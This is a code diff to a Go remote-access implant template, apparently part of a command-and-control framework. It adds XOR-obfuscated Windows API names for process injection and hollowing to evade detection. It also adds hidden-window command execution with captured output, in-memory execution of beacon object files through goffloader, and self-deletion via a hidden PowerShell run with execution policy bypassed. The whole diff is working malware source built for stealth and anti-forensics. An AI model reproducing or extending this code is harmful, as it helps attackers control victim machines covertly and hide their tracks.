@@ -21,7 +21,18 @@ import (
 	"unsafe"
 
 	"github.com/fernet/fernet-go"
+	"github.com/praetorian-inc/goffloader/src/coff"
+	"github.com/praetorian-inc/goffloader/src/lighthouse"
 )
+
+// Obfuscation function for runtime deobfuscation
+func deobfuscateString(obfuscated []byte, key byte) string {
+	result := make([]byte, len(obfuscated))
+	for i := 0; i < len(obfuscated); i++ {
+		result[i] = obfuscated[i] ^ key
+	}
+	return string(result)
+}
 
 const (
 	PROCESS_CREATE_THREAD = 0x0002
@@ -42,6 +53,17 @@ const (
 	TH32CS_SNAPPROCESS = 0x00000002
 	MAX_PATH = 260
 
+	// For process creation
+	CREATE_NEW_CONSOLE = 0x00000010
+	CREATE_NO_WINDOW = 0x08000000
+	STARTF_USESHOWWINDOW = 0x00000001
+	STARTF_USESTDHANDLES = 0x00000100
+	SW_HIDE = 0
+
+	// For pipe creation
+	FILE_ATTRIBUTE_NORMAL = 0x00000080
+	INVALID_HANDLE_VALUE = 0xFFFFFFFF
+
 	// For process hollowing
 	IMAGE_DOS_SIGNATURE = 0x5A4D
 	IMAGE_NT_SIGNATURE = 0x00004550
@@ -53,23 +75,60 @@ const (
 )
 
 var (
-	kernel32 = syscall.NewLazyDLL("kernel32.dll")
-	ntdll = syscall.NewLazyDLL("ntdll.dll")
-	procOpenProcess = kernel32.NewProc("OpenProcess")
-	procVirtualAllocEx = kernel32.NewProc("VirtualAllocEx")
-	procWriteProcessMemory = kernel32.NewProc("WriteProcessMemory")
-	procCreateRemoteThread = kernel32.NewProc("CreateRemoteThread")
-	procVirtualProtectEx = kernel32.NewProc("VirtualProtectEx")
-	procCreateToolhelp32Snapshot = kernel32.NewProc("CreateToolhelp32Snapshot")
-	procProcess32First = kernel32.NewProc("Process32FirstW")
-	procProcess32Next = kernel32.NewProc("Process32NextW")
-	procCreateProcess = kernel32.NewProc("CreateProcessW")
-	procResumeThread = kernel32.NewProc("ResumeThread")
-	procSuspendThread = kernel32.NewProc("SuspendThread")
-	procGetThreadContext = kernel32.NewProc("GetThreadContext")
-	procSetThreadContext = kernel32.NewProc("SetThreadContext")
-	procReadProcessMemory = kernel32.NewProc("ReadProcessMemory")
-	procNtUnmapViewOfSection = ntdll.NewProc("NtUnmapViewOfSection")
+	// Obfuscated DLL names and API functions
+	obfuscatedKernel32DLL = []byte{0x29, 0x27, 0x30, 0x2c, 0x27, 0x2e, 0x71, 0x70, 0x6c, 0x26, 0x2e, 0x2e} // "kernel32.dll"
+	obfuscatedNtdllDLL = []byte{0x2c, 0x36, 0x26, 0x2e, 0x2e, 0x6c, 0x26, 0x2e, 0x2e} // "ntdll.dll"
+	obfuscatedUser32DLL = []byte{0x37, 0x31, 0x27, 0x30, 0x71, 0x70, 0x6c, 0x26, 0x2e, 0x2e} // "user32.dll"
+	obfuscatedOpenProcess = []byte{0x0d, 0x32, 0x27, 0x2c, 0x12, 0x30, 0x2d, 0x21, 0x27, 0x31, 0x31} // "OpenProcess"
+	obfuscatedVirtualAllocEx = []byte{0x14, 0x2b, 0x30, 0x36, 0x37, 0x23, 0x2e, 0x03, 0x2e, 0x2e, 0x2d, 0x21, 0x07, 0x3a} // "VirtualAllocEx"
+	obfuscatedWriteProcessMemory = []byte{0x15, 0x30, 0x2b, 0x36, 0x27, 0x12, 0x30, 0x2d, 0x21, 0x27, 0x31, 0x31, 0x0f, 0x27, 0x2f, 0x2d, 0x30, 0x3b} // "WriteProcessMemory"
+	obfuscatedCreateRemoteThread = []byte{0x01, 0x30, 0x27, 0x23, 0x36, 0x27, 0x10, 0x27, 0x2f, 0x2d, 0x36, 0x27, 0x16, 0x2a, 0x30, 0x27, 0x23, 0x26} // "CreateRemoteThread"
+	obfuscatedVirtualProtectEx = []byte{0x14, 0x2b, 0x30, 0x36, 0x37, 0x23, 0x2e, 0x12, 0x30, 0x2d, 0x36, 0x27, 0x21, 0x36, 0x07, 0x3a} // "VirtualProtectEx"
+	obfuscatedCreateToolhelp32Snapshot = []byte{0x01, 0x30, 0x27, 0x23, 0x36, 0x27, 0x16, 0x2d, 0x2d, 0x2e, 0x2a, 0x27, 0x2e, 0x32, 0x71, 0x70, 0x11, 0x2c, 0x23, 0x32, 0x31, 0x2a, 0x2d, 0x36} // "CreateToolhelp32Snapshot"
+	obfuscatedProcess32First = []byte{0x12, 0x30, 0x2d, 0x21, 0x27, 0x31, 0x31, 0x71, 0x70, 0x04, 0x2b, 0x30, 0x31, 0x36, 0x15} // "Process32FirstW"
+	obfuscatedProcess32Next = []byte{0x12, 0x30, 0x2d, 0x21, 0x27, 0x31, 0x31, 0x71, 0x70, 0x0c, 0x27, 0x3a, 0x36, 0x15} // "Process32NextW"
+	obfuscatedCreateProcess = []byte{0x01, 0x30, 0x27, 0x23, 0x36, 0x27, 0x12, 0x30, 0x2d, 0x21, 0x27, 0x31, 0x31, 0x15} // "CreateProcessW"
+	obfuscatedResumeThread = []byte{0x10, 0x27, 0x31, 0x37, 0x2f, 0x27, 0x16, 0x2a, 0x30, 0x27, 0x23, 0x26} // "ResumeThread"
+	obfuscatedSuspendThread = []byte{0x11, 0x37, 0x31, 0x32, 0x27, 0x2c, 0x26, 0x16, 0x2a, 0x30, 0x27, 0x23, 0x26} // "SuspendThread"
+	obfuscatedGetThreadContext = []byte{0x05, 0x27, 0x36, 0x16, 0x2a, 0x30, 0x27, 0x23, 0x26, 0x01, 0x2d, 0x2c, 0x36, 0x27, 0x3a, 0x36} // "GetThreadContext"
+	obfuscatedSetThreadContext = []byte{0x11, 0x27, 0x36, 0x16, 0x2a, 0x30, 0x27, 0x23, 0x26, 0x01, 0x2d, 0x2c, 0x36, 0x27, 0x3a, 0x36} // "SetThreadContext"
+	obfuscatedReadProcessMemory = []byte{0x10, 0x27, 0x23, 0x26, 0x12, 0x30, 0x2d, 0x21, 0x27, 0x31, 0x31, 0x0f, 0x27, 0x2f, 0x2d, 0x30, 0x3b} // "ReadProcessMemory"
+	obfuscatedNtUnmapViewOfSection = []byte{0x0c, 0x36, 0x17, 0x2c, 0x2f, 0x23, 0x32, 0x14, 0x2b, 0x27, 0x35, 0x0d, 0x24, 0x11, 0x27, 0x21, 0x36, 0x2b, 0x2d, 0x2c} // "NtUnmapViewOfSection"
+	obfuscatedGetConsoleWindow = []byte{0x05, 0x27, 0x36, 0x01, 0x2d, 0x2c, 0x31, 0x2d, 0x2e, 0x27, 0x15, 0x2b, 0x2c, 0x26, 0x2d, 0x35} // "GetConsoleWindow"
+	obfuscatedShowWindow = []byte{0x11, 0x2a, 0x2d, 0x35, 0x15, 0x2b, 0x2c, 0x26, 0x2d, 0x35} // "ShowWindow"
+	obfuscatedFreeConsole = []byte{0x04, 0x30, 0x27, 0x27, 0x01, 0x2d, 0x2c, 0x31, 0x2d, 0x2e, 0x27} // "FreeConsole"
+	obfuscatedGetExitCodeProcess = []byte{0x05, 0x27, 0x36, 0x07, 0x3a, 0x2b, 0x36, 0x01, 0x2d, 0x26, 0x27, 0x12, 0x30, 0x2d, 0x21, 0x27, 0x31, 0x31} // "GetExitCodeProcess"
+	obfuscatedCreatePipe = []byte{0x01, 0x30, 0x27, 0x23, 0x36, 0x27, 0x12, 0x2b, 0x32, 0x27} // "CreatePipe"
+	obfuscatedReadFile = []byte{0x10, 0x27, 0x23, 0x26, 0x04, 0x2b, 0x2e, 0x27} // "ReadFile"
+
+	// XOR key for deobfuscation
+	obfuscationKey = byte(0x42)
+
+	// DLL and procedure handles
+	kernel32 = syscall.NewLazyDLL(deobfuscateString(obfuscatedKernel32DLL, obfuscationKey))
+	ntdll = syscall.NewLazyDLL(deobfuscateString(obfuscatedNtdllDLL, obfuscationKey))
+	user32 = syscall.NewLazyDLL(deobfuscateString(obfuscatedUser32DLL, obfuscationKey))
+	procOpenProcess = kernel32.NewProc(deobfuscateString(obfuscatedOpenProcess, obfuscationKey))
+	procVirtualAllocEx = kernel32.NewProc(deobfuscateString(obfuscatedVirtualAllocEx, obfuscationKey))
+	procWriteProcessMemory = kernel32.NewProc(deobfuscateString(obfuscatedWriteProcessMemory, obfuscationKey))
+	procCreateRemoteThread = kernel32.NewProc(deobfuscateString(obfuscatedCreateRemoteThread, obfuscationKey))
+	procVirtualProtectEx = kernel32.NewProc(deobfuscateString(obfuscatedVirtualProtectEx, obfuscationKey))
+	procCreateToolhelp32Snapshot = kernel32.NewProc(deobfuscateString(obfuscatedCreateToolhelp32Snapshot, obfuscationKey))
+	procProcess32First = kernel32.NewProc(deobfuscateString(obfuscatedProcess32First, obfuscationKey))
+	procProcess32Next = kernel32.NewProc(deobfuscateString(obfuscatedProcess32Next, obfuscationKey))
+	procCreateProcess = kernel32.NewProc(deobfuscateString(obfuscatedCreateProcess, obfuscationKey))
+	procResumeThread = kernel32.NewProc(deobfuscateString(obfuscatedResumeThread, obfuscationKey))
+	procSuspendThread = kernel32.NewProc(deobfuscateString(obfuscatedSuspendThread, obfuscationKey))
+	procGetThreadContext = kernel32.NewProc(deobfuscateString(obfuscatedGetThreadContext, obfuscationKey))
+	procSetThreadContext = kernel32.NewProc(deobfuscateString(obfuscatedSetThreadContext, obfuscationKey))
+	procReadProcessMemory = kernel32.NewProc(deobfuscateString(obfuscatedReadProcessMemory, obfuscationKey))
+	procNtUnmapViewOfSection = ntdll.NewProc(deobfuscateString(obfuscatedNtUnmapViewOfSection, obfuscationKey))
+	procFreeConsole = kernel32.NewProc(deobfuscateString(obfuscatedFreeConsole, obfuscationKey))
+	procShowWindow = user32.NewProc(deobfuscateString(obfuscatedShowWindow, obfuscationKey))
+	procGetConsoleWindow = kernel32.NewProc(deobfuscateString(obfuscatedGetConsoleWindow, obfuscationKey))
+	procGetExitCodeProcess = kernel32.NewProc(deobfuscateString(obfuscatedGetExitCodeProcess, obfuscationKey))
+	procCreatePipe = kernel32.NewProc(deobfuscateString(obfuscatedCreatePipe, obfuscationKey))
+	procReadFile = kernel32.NewProc(deobfuscateString(obfuscatedReadFile, obfuscationKey))
 )
 
 // PROCESSENTRY32 structure for process enumeration
@@ -216,6 +275,12 @@ type IMAGE_SECTION_HEADER struct {
 	Characteristics uint32
 }
 
+type SECURITY_ATTRIBUTES struct {
+	NLength              uint32
+	LPSecurityDescriptor uintptr
+	bInheritHandle       uint32
+}
+
 type PROCESS_INFORMATION struct {
 	Process   uintptr
 	Thread    uintptr
@@ -301,6 +366,223 @@ func createProcess(applicationName *uint16, commandLine *uint16, processAttribut
 		return callErr
 	}
 	return nil
+}
+
+// executeCommandHidden executes a Windows command with the window hidden and captures output using pipes
+func executeCommandHidden(command string) (string, error) {
+	if runtime.GOOS != "windows" {
+		return "", fmt.Errorf("executeCommandHidden only supported on Windows")
+	}
+
+	// Create anonymous pipes for capturing output
+	var saAttr SECURITY_ATTRIBUTES
+	saAttr.NLength = uint32(unsafe.Sizeof(saAttr))
+	saAttr.bInheritHandle = 1 // Set inherit handle to true
+	saAttr.LPSecurityDescriptor = 0
+
+	// Create stdout pipe
+	var stdoutRead, stdoutWrite uintptr
+	ret, _, _ := procCreatePipe.Call(
+		uintptr(unsafe.Pointer(&stdoutRead)),
+		uintptr(unsafe.Pointer(&stdoutWrite)),
+		uintptr(unsafe.Pointer(&saAttr)),
+	)
+	if ret == 0 {
+		return "", fmt.Errorf("failed to create stdout pipe")
+	}
+
+	// Create stderr pipe
+	var stderrRead, stderrWrite uintptr
+	ret, _, _ = procCreatePipe.Call(
+		uintptr(unsafe.Pointer(&stderrRead)),
+		uintptr(unsafe.Pointer(&stderrWrite)),
+		uintptr(unsafe.Pointer(&saAttr)),
+	)
+	if ret == 0 {
+		syscall.CloseHandle(syscall.Handle(stdoutRead))
+		syscall.CloseHandle(syscall.Handle(stdoutWrite))
+		return "", fmt.Errorf("failed to create stderr pipe")
+	}
+
+	// Prepare the command line
+	var cmdLine *uint16
+	shell := fmt.Sprintf("cmd /C %s", command)
+	cmdLine, err := syscall.UTF16PtrFromString(shell)
+	if err != nil {
+		syscall.CloseHandle(syscall.Handle(stdoutRead))
+		syscall.CloseHandle(syscall.Handle(stdoutWrite))
+		syscall.CloseHandle(syscall.Handle(stderrRead))
+		syscall.CloseHandle(syscall.Handle(stderrWrite))
+		return "", err
+	}
+
+	// Initialize STARTUPINFO structure with pipe handles
+	var si STARTUPINFO
+	si.Cb = uint32(unsafe.Sizeof(si))
+	si.Flags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES
+	si.ShowWindow = SW_HIDE // Hide the window
+	si.StdInput = 0        // Use default input
+	si.StdOutput = stdoutWrite // Redirect stdout to our pipe (child writes to this)
+	si.StdError = stderrWrite  // Redirect stderr to our pipe (child writes to this)
+
+	// Initialize PROCESS_INFORMATION structure
+	var pi PROCESS_INFORMATION
+
+	// Create the process with hidden window and redirected output
+	err = createProcess(
+		nil, // applicationName
+		cmdLine, // commandLine
+		nil, // processAttributes
+		nil, // threadAttributes
+		true, // inheritHandles - important for pipe inheritance
+		CREATE_NO_WINDOW, // creationFlags - this is key for hiding the window
+		0, // environment
+		nil, // currentDirectory
+		&si, // startupInfo
+		&pi, // processInformation
+	)
+
+	if err != nil {
+		syscall.CloseHandle(syscall.Handle(stdoutRead))
+		syscall.CloseHandle(syscall.Handle(stdoutWrite))
+		syscall.CloseHandle(syscall.Handle(stderrRead))
+		syscall.CloseHandle(syscall.Handle(stderrWrite))
+		return "", err
+	}
+
+	// Close the write handles in parent after process creation since child now has them
+	syscall.CloseHandle(syscall.Handle(stdoutWrite))
+	syscall.CloseHandle(syscall.Handle(stderrWrite))
+
+	// Close process and thread handles when done
+	defer syscall.CloseHandle(syscall.Handle(pi.Process))
+	defer syscall.CloseHandle(syscall.Handle(pi.Thread))
+
+	// Set up channels to read stdout and stderr concurrently to prevent pipe buffer overflow
+	stdoutChan := make(chan []byte)
+	stderrChan := make(chan []byte)
+
+	// Read stdout concurrently
+	go func() {
+		var stdoutBytes []byte
+		var buffer [4096]byte
+		var bytesRead uint32
+		totalRead := 0
+		const maxSize = 1024 * 1024 // 1MB limit - same as non-Windows version
+
+		for {
+			// Check if we've reached the size limit
+			if totalRead >= maxSize {
+				stdoutBytes = append(stdoutBytes, []byte("\n[OUTPUT TRUNCATED: Max size reached]")...)
+				break
+			}
+
+			ret, _, _ := procReadFile.Call(
+				stdoutRead,
+				uintptr(unsafe.Pointer(&buffer[0])),
+				uintptr(len(buffer)),
+				uintptr(unsafe.Pointer(&bytesRead)),
+				0,
+			)
+
+			// Only continue if we successfully read data and haven't exceeded size
+			if ret == 0 || bytesRead == 0 {
+				break
+			}
+
+			// Check if adding this chunk would exceed our size limit
+			if totalRead + int(bytesRead) > maxSize {
+				// Only add what fits within our limit
+				remaining := maxSize - totalRead
+				stdoutBytes = append(stdoutBytes, buffer[:remaining]...)
+				stdoutBytes = append(stdoutBytes, []byte("\n[OUTPUT TRUNCATED: Max size reached]")...)
+				break
+			}
+
+			stdoutBytes = append(stdoutBytes, buffer[:bytesRead]...)
+			totalRead += int(bytesRead)
+		}
+		stdoutChan <- stdoutBytes
+	}()
+
+	// Read stderr concurrently
+	go func() {
+		var stderrBytes []byte
+		var buffer [4096]byte
+		var bytesRead uint32
+		totalRead := 0
+		const maxSize = 1024 * 1024 // 1MB limit - same as non-Windows version
+
+		for {
+			// Check if we've reached the size limit
+			if totalRead >= maxSize {
+				stderrBytes = append(stderrBytes, []byte("\n[OUTPUT TRUNCATED: Max size reached]")...)
+				break
+			}
+
+			ret, _, _ := procReadFile.Call(
+				stderrRead,
+				uintptr(unsafe.Pointer(&buffer[0])),
+				uintptr(len(buffer)),
+				uintptr(unsafe.Pointer(&bytesRead)),
+				0,
+			)
+
+			// Only continue if we successfully read data and haven't exceeded size
+			if ret == 0 || bytesRead == 0 {
+				break
+			}
+
+			// Check if adding this chunk would exceed our size limit
+			if totalRead + int(bytesRead) > maxSize {
+				// Only add what fits within our limit
+				remaining := maxSize - totalRead
+				stderrBytes = append(stderrBytes, buffer[:remaining]...)
+				stderrBytes = append(stderrBytes, []byte("\n[OUTPUT TRUNCATED: Max size reached]")...)
+				break
+			}
+
+			stderrBytes = append(stderrBytes, buffer[:bytesRead]...)
+			totalRead += int(bytesRead)
+		}
+		stderrChan <- stderrBytes
+	}()
+
+	// Wait for the process to complete with a timeout to prevent hanging
+	result, err := syscall.WaitForSingleObject(syscall.Handle(pi.Process), 60000) // 60 second timeout
+	if err != nil || result == syscall.WAIT_TIMEOUT {
+		// If timeout occurs, try to terminate the process gracefully
+		syscall.TerminateProcess(syscall.Handle(pi.Process), 255)
+		return fmt.Sprintf("[ERROR] Command execution timed out after 60 seconds"), nil
+	}
+
+	// Get the output from both channels
+	stdoutBytes := <-stdoutChan
+	stderrBytes := <-stderrChan
+
+	// Close the read handles
+	syscall.CloseHandle(syscall.Handle(stdoutRead))
+	syscall.CloseHandle(syscall.Handle(stderrRead))
+
+	output := string(stdoutBytes) + string(stderrBytes)
+
+	// Get the exit code of the process
+	var exitCode uint32
+	procGetExitCodeProcess.Call(
+		uintptr(pi.Process),
+		uintptr(unsafe.Pointer(&exitCode)),
+	)
+
+	// If no output and process exited with error, return error info
+	if len(output) == 0 && exitCode != 0 {
+		return fmt.Sprintf("[ERROR] Command execution failed with exit code: %d", exitCode), nil
+	}
+
+	if output == "" {
+		return "[Command executed successfully - no output]", nil
+	}
+
+	return output, nil
 }
 
 func resumeThread(threadHandle uintptr) (uint32, error) {
@@ -810,48 +1092,134 @@ func (a *{AGENT_STRUCT_NAME}) {AGENT_EXECUTE_FUNC}(command string) string {
 		strings.Contains(commandLower, "powershell -")
 
 
-	if isPowerShell {
-		var cmd *exec.Cmd
-
-		if runtime.GOOS == "windows" {
-			cmd = exec.Command("powershell", "-Command", command)
-		} else {
-			cmd = exec.Command("pwsh", "-Command", command)
-		}
-
-		var stdout, stderr bytes.Buffer
-		cmd.Stdout = &stdout
-		cmd.Stderr = &stderr
-
-		err := cmd.Run()
+	if runtime.GOOS == "windows" {
+		// Use the hidden command execution function for Windows to prevent any console window flickering
+		result, err := executeCommandHidden(command)
 		if err != nil {
-			return fmt.Sprintf("[ERROR] PowerShell command execution failed: %v", err)
+			return fmt.Sprintf("[ERROR] Command execution failed: %v", err)
 		}
-
-		output := stdout.String() + stderr.String()
-		if output == "" {
-			return "[PowerShell command executed successfully - no output]"
-		}
-		return output
+		return result
 	} else {
+		// For non-Windows systems, use the standard execution with timeout and size limits
 		var cmd *exec.Cmd
 
-		if runtime.GOOS == "windows" {
-			cmd = exec.Command("cmd", "/C", command)
+		if isPowerShell {
+			cmd = exec.Command("pwsh", "-Command", command)
 		} else {
 			cmd = exec.Command("sh", "-c", command)
 		}
 
-		var stdout, stderr bytes.Buffer
-		cmd.Stdout = &stdout
-		cmd.Stderr = &stderr
-
-		err := cmd.Run()
+		// Create pipes to read output with size limits
+		stdoutPipe, err := cmd.StdoutPipe()
 		if err != nil {
-			return fmt.Sprintf("[ERROR] Command execution failed: %v", err)
+			return fmt.Sprintf("[ERROR] Failed to create stdout pipe: %v", err)
 		}
 
-		output := stdout.String() + stderr.String()
+		stderrPipe, err := cmd.StderrPipe()
+		if err != nil {
+			return fmt.Sprintf("[ERROR] Failed to create stderr pipe: %v", err)
+		}
+
+		// Start the command
+		if err := cmd.Start(); err != nil {
+			return fmt.Sprintf("[ERROR] Failed to start command: %v", err)
+		}
+
+		// Read stdout with size limit
+		stdoutChan := make(chan string)
+		go func() {
+			var stdoutBytes []byte
+			buffer := make([]byte, 4096)
+			totalRead := 0
+			const maxSize = 1024 * 1024 // 1MB limit - same as Windows version
+
+			for {
+				// Check if we've reached the size limit
+				if totalRead >= maxSize {
+					stdoutBytes = append(stdoutBytes, []byte("\n[OUTPUT TRUNCATED: Max size reached]")...)
+					break
+				}
+
+				n, err := stdoutPipe.Read(buffer)
+				if n > 0 {
+					// Check if adding this chunk would exceed our size limit
+					if totalRead + n > maxSize {
+						// Only add what fits within our limit
+						remaining := maxSize - totalRead
+						stdoutBytes = append(stdoutBytes, buffer[:remaining]...)
+						stdoutBytes = append(stdoutBytes, []byte("\n[OUTPUT TRUNCATED: Max size reached]")...)
+						break
+					}
+
+					stdoutBytes = append(stdoutBytes, buffer[:n]...)
+					totalRead += n
+				}
+				if err != nil {
+					break
+				}
+			}
+			stdoutChan <- string(stdoutBytes)
+		}()
+
+		// Read stderr with size limit
+		stderrChan := make(chan string)
+		go func() {
+			var stderrBytes []byte
+			buffer := make([]byte, 4096)
+			totalRead := 0
+			const maxSize = 1024 * 1024 // 1MB limit - same as Windows version
+
+			for {
+				// Check if we've reached the size limit
+				if totalRead >= maxSize {
+					stderrBytes = append(stderrBytes, []byte("\n[OUTPUT TRUNCATED: Max size reached]")...)
+					break
+				}
+
+				n, err := stderrPipe.Read(buffer)
+				if n > 0 {
+					// Check if adding this chunk would exceed our size limit
+					if totalRead + n > maxSize {
+						// Only add what fits within our limit
+						remaining := maxSize - totalRead
+						stderrBytes = append(stderrBytes, buffer[:remaining]...)
+						stderrBytes = append(stderrBytes, []byte("\n[OUTPUT TRUNCATED: Max size reached]")...)
+						break
+					}
+
+					stderrBytes = append(stderrBytes, buffer[:n]...)
+					totalRead += n
+				}
+				if err != nil {
+					break
+				}
+			}
+			stderrChan <- string(stderrBytes)
+		}()
+
+		// Wait for command completion with timeout
+		done := make(chan error, 1)
+		go func() {
+			done <- cmd.Wait()
+		}()
+
+		select {
+		case <-time.After(60 * time.Second): // 60 second timeout to match Windows version
+			if cmd.Process != nil {
+				cmd.Process.Kill()
+			}
+			return "[ERROR] Command execution timed out after 60 seconds"
+		case err := <-done:
+			if err != nil {
+				return fmt.Sprintf("[ERROR] Command execution failed: %v", err)
+			}
+		}
+
+		// Get the output from both channels
+		stdoutResult := <-stdoutChan
+		stderrResult := <-stderrChan
+
+		output := stdoutResult + stderrResult
 		if output == "" {
 			return "[Command executed successfully - no output]"
 		}
@@ -1034,12 +1402,42 @@ func (a *{AGENT_STRUCT_NAME}) {AGENT_HANDLE_BOF_FUNC}(command string) string {
 		bofArgs = parts[2]
 	}
 
-	_, err := base64.StdEncoding.DecodeString(encodedBOF)
+	// Decode the base64-encoded BOF
+	bofBytes, err := base64.StdEncoding.DecodeString(encodedBOF)
 	if err != nil {
 		return fmt.Sprintf("[ERROR] Invalid BOF data format: %v", err)
 	}
 
-	return fmt.Sprintf("[SUCCESS] BOF executed with args: %s", bofArgs)
+	// Parse and prepare BOF arguments using lighthouse module
+	var args []string
+	if bofArgs != "" {
+		argParts := strings.Fields(bofArgs)
+		// Common types: 'z' for null-terminated strings, 'i' for integers, etc.
+		for _, argPart := range argParts {
+			args = append(args, "z"+argPart) // Default to null-terminated string
+		}
+	}
+
+	// Pack the arguments using lighthouse
+	argBytes := []byte{}
+	if len(args) > 0 {
+		argBytes, err = lighthouse.PackArgs(args)
+		if err != nil {
+			return fmt.Sprintf("[ERROR] Failed to pack BOF arguments: %v", err)
+		}
+	}
+
+	// Execute the BOF in-memory using goffloader
+	output, err := coff.Load(bofBytes, argBytes)
+	if err != nil {
+		return fmt.Sprintf("[ERROR] Failed to execute BOF: %v", err)
+	}
+
+	if output == "" {
+		return "[SUCCESS] BOF executed with no output"
+	}
+
+	return output
 }
 
 func (a *{AGENT_STRUCT_NAME}) {AGENT_GET_PROCESS_ID_FUNC}(processName string) (uint32, error) {
@@ -1929,39 +2327,28 @@ func (a *{AGENT_STRUCT_NAME}) {AGENT_SELF_DELETE_FUNC}() {
 		time.Sleep(100 * time.Millisecond) // Brief delay to ensure process exits
 
 		if runtime.GOOS == "windows" {
-			// Create a PowerShell script to delete the executable after the process exits
-			psScript := fmt.Sprintf(`
-				Start-Sleep -Milliseconds 500
-				$retries = 0
-				$maxRetries = 10
+			psCommand := fmt.Sprintf(`
+				Start-Sleep -Milliseconds 500;
+				$targetPath = '%s';
+				$retries = 0;
+				$maxRetries = 10;
 				while ($retries -lt $maxRetries) {
-					try {
-						Remove-Item -Path "%s" -Force
-						break
-					} catch {
-						Start-Sleep -Milliseconds 500
-						$retries++
+					if (Test-Path $targetPath) {
+						try {
+							Remove-Item -Path $targetPath -Force -ErrorAction Stop;
+							break;
+						} catch {
+							Start-Sleep -Milliseconds 500;
+							$retries++;
+						}
+					} else {
+						break;
 					}
 				}
 			`, executable)
 
-			psFile := executable + ".ps1"
-
-			if err := ioutil.WriteFile(psFile, []byte(psScript), 0644); err != nil {
-				// If we can't create the PowerShell script, try direct deletion
-				os.Remove(executable)
-				os.Exit(0)
-				return
-			}
-
-			// Execute the PowerShell script in a hidden window to delete the file
-			exec.Command("powershell", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-File", psFile).Start()
-
-			// Also try to delete the PS1 file after some time
-			go func() {
-				time.Sleep(2 * time.Second)
-				os.Remove(psFile)
-			}()
+			cmd := exec.Command("powershell", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-Command", psCommand)
+			cmd.Start()
 		} else {
 			os.Remove(executable)
 		}
@@ -1971,10 +2358,19 @@ func (a *{AGENT_STRUCT_NAME}) {AGENT_SELF_DELETE_FUNC}() {
 }
 
 func {AGENT_HIDE_CONSOLE_FUNC}() {
-	// Hide console window on Windows
+	// Hide console window on Windows using direct Windows API calls for immediate effect
 	if runtime.GOOS == "windows" {
-		cmd := exec.Command("powershell", "-WindowStyle", "Hidden", "-Command", "try { Add-Type -Name Win32 -Namespace Console -MemberDefinition '[DllImport(\\\"kernel32.dll\\\")]^ public static extern IntPtr GetConsoleWindow(); [DllImport(\\\"user32.dll\\\")]^ public static extern bool ShowWindow(IntPtr hWnd^, int nCmdShow);'; $consolePtr = [Console.Win32]::GetConsoleWindow(); [Console.Win32]::ShowWindow($consolePtr, 0) } catch { }")
-		_ = cmd.Run() // Run command but ignore errors
+		// Method 1: Use ShowWindow to hide the console window
+		consoleHandle, _, _ := procGetConsoleWindow.Call()
+		if consoleHandle != 0 {
+			procShowWindow.Call(
+				consoleHandle,  // HWND - console window handle
+				uintptr(0),     // nCmdShow - SW_HIDE constant
+			)
+		}
+
+		// Method 2: Free the console to completely detach from the parent process
+		procFreeConsole.Call()
 	}
 }
 
